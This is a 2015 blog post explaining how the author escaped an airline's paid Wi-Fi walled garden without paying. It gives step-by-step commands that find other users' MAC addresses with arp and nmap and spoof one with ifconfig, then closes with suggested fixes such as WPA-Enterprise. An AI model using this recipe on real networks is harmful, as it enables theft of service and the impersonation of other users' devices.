---
layout: post
title:  "Escaping the Wi-Fi garden"
date:   2015-08-12 20:00:00
categories: hacking wifi linux mac
---
As a recent graduate of Computer Science, I had the opportunity to enjoy free travel around the United States last fall while interviewing. Recruiters are clever -- as "bait," they often include credentials for free in-flight Wi-Fi to and from on-site interviews. No joy with first-class seating yet, though.

Unfortunately, one of the cheaper airlines I flew with failed to properly print my internet credentials, leaving me with no internet for the flight. I've always wondered if it was possible to bypass the access control filters on gardened Wi-Fi, and I figured this was a perfect (pseudo-ethical) opportunity to try my hand at cracking a live implementation. I suppose I could have explained the predicament to a flight-attendant, but this was much more interesting.

The long story made short: Every walled garden I've found is filtered by MAC address. A simple MAC change (to someone with access) is enough to escape the garden. Don't even need to steal auth cookies."

If you know how to find users to imitate, and how to change your MAC address, you can stop reading now. Otherwise, read on.

##Attack Background
Most paid/restricted Wi-Fi access points are left setup in an "open" encryption mode (e.g. no encryption whatsoever). When connecting to one of these Wi-Fi networks, the user is placed into a "walled garden," where they must enter a code-of-the-day, room number + last name, payment information, or similar to gain access to the world wide web.

![walled garden example][walledgarden]

Walled gardens ease initial access to premium networks since no password is needed, but since authentication is no longer provided by an encryption key, attack surface of the network is more substantial (remember using [firesheep][firesheep] at coffee shops?)

The in-flight Wi-Fi provider I evaluated -- and several subsequent hotels -- use [squid proxy][squidproxy] to trap users in a walled garden until authenticated. After auth, the user's MAC address is added to a bypass table, allowing them to leave the garden. Since access is controlled purely by MAC filtering, a simple MAC address change (to a user with access) will allow unfettered access to the network.

##The attack
This attack will work on any operating system supporting MAC address changes (basically all of them). I've tried this attack on both Linux and OS X, and the differences between them are small enough that I'll only highlight them parenthetically. The attack is also possible on Windows, but finding the tools necessary to perform it is an exercise I have no interest in performing.

To perform this attack we will need to do two things: First, we must find another user who is on the bypass list (has gained access to the internet somehow). We can imitate this user by using their MAC address as our own.

#Prep
On both Linux and OS X, you will likely need the [NMap][nmap] tool. The rest of the required tools (ifconfig, arp) come standard with any reasonable Unix or Linux distribution. Nmap can be installed using apt-get on Debian variants using apt-get `sudo apt-get install nmap` and using [homebrew][homebrew] on OS X `brew install nmap`.

#Step 1: Finding a victim
Finding a victim is the most time consuming and boring portion of this attack. First, we will enumerate all other hosts on the network to get their MAC addresses. This can be accomplished by running the ARP command (you must be connected to the network first).

{% highlight bash %}
arp -a
{% endhighlight %}

This will return a list of other users on the network that are in your ARP table in this format.

{% highlight text %}
`hostname (ipAddress0) "at" ma:ca:dd:re:ss:xx "on" interfacename`
{% endhighlight %}

Here's an example:
{% highlight text %}
? (10.0.0.1) at ab:cd:12:34:12:34 on en0
? (10.0.0.90) at 12:12:12:12:12:12 on en0
vertigo-macbook.local (10.0.0.124) at ab:ba:ab:ba:ab:ba on en0
? (10.0.0.240) at 11:22:33:44:55:66 on en0
{% endhighlight %}

However, unless you've received ARP broadcasts about clients, this list will be empty/sparse. You can do a quick ping scan of the network to populate your ARP table using nmap:

{% highlight bash %}
sudo nmap -v -sP 10.0.0.* | grep "MAC Address"
{% endhighlight %}

Output:

{% highlight text %}
MAC Address: ab:cd:12:34:12:34 (Intel)
MAC Address: 12:12:12:12:12:12 (ASUStek)
MAC Address: ab:ba:ab:ba:ab:ba (Apple)
MAC Address: 11:22:33:44:55:66 (Sony)
{% endhighlight %}

#Step 2: Escaping the garden
With the list from nmap or the arp command, we now know potential spoof targets.

It's not worth sniffing the network to figure out who has access and who doesn't (most people will anyway), so just pick a random MAC address from the list to spoof.

Spoofing a MAC address is easy on \*nix boxes with the ifconfig command. You'll need to know the name of your network interface, of course. On my OS X machine, the wireless interface is `en0`. On my Ubuntu machine, it's `wlan0`. Linux and OS X are subtly different here -- on Linux you must disable your network interface before changing the MAC address, while OS X actually won't let you change MAC addresses on cards that are disabled.

OS X:
{% highlight bash %}
sudo ifconfig en0 ether <spoofed mac>
sudo ifconfig en0 down
sudo ifconfig en0 up
{% endhighlight %}
\<reconnect to target network\>

Linux:
{% highlight bash %}
sudo ifconfig wlan0 down
sudo ifconfig wlan0 ether <spoofed mac>
sudo ifconfig wlan0 up
{% endhighlight %}
\<reconnect to target network\>

At this point, you can test connectivity. If you've failed to connect, try another MAC address from the list.

##A potential fix
Premium Wi-Fi providers are looking for flexibility and convenience. Open networks make it easy for customers to connect, and walled gardens make it easy to charge users and limit access time on a customer-by-customer basis -- once time expires, just remove the MAC from the bypass table. However, attacks like this one render unencrypted garden networks ineffectual at keeping a persistent attacker offline.

Since WEP and WPA-Personal are neither flexible (access key is the same for everyone, so time limiting is difficult), nor convenient (key is likely distributed by physical means), another solution must be found.

#WPA-Enterprise
WPA backed by an authentication server (RADIUS) seems like a semi-workable solution. WPA-Enterprise issues per-user certificates allowing easy revocation of a specific user's access to the network. Since communication between the gateway and the user is encrypted using a secret key, it is unlikely (read: impossible) that an attacker could imitate a legitimate user to gain access to the network.

Unfortunately, distributing these per-user keys would be difficult. Perhaps the keys could be encoded in a QR-code or USB device for mobile or laptop devices for distribution while selling those crappy earbuds to economy-class customers. Another solution would be to distribute the keys via a separate open-encryption Wi-Fi network over an HTTPS connection, preventing attackers from eavesdropping the secrets needed to connect to the internet-facing encrypted network.

In reality though, most airlines probably don't care too much about this attack. These kinds of premium networks are only interested in having enough security to keep 99% of users behaving nicely, and view the 1% as acceptable overhead compared to the cost of deploying an admittedly complex WPA-Enterprise network. Seeing as how there were no online resources (that I could find) regarding the complete bypass of Wi-Fi gardens prior to the writing of this post, most would-be do-badders probably don't know how to break out of the garden anyway.


[firesheep]:      https://codebutler.github.io/firesheep/tc12/
[squidproxy]:     http://www.squid-cache.org/
[nmap]:           https://nmap.org/
[homebrew]:       http://brew.sh/
[walledgarden]:   {{ site.url }}/assets/img/escaping-the-wifi-garden/walledgarden.png
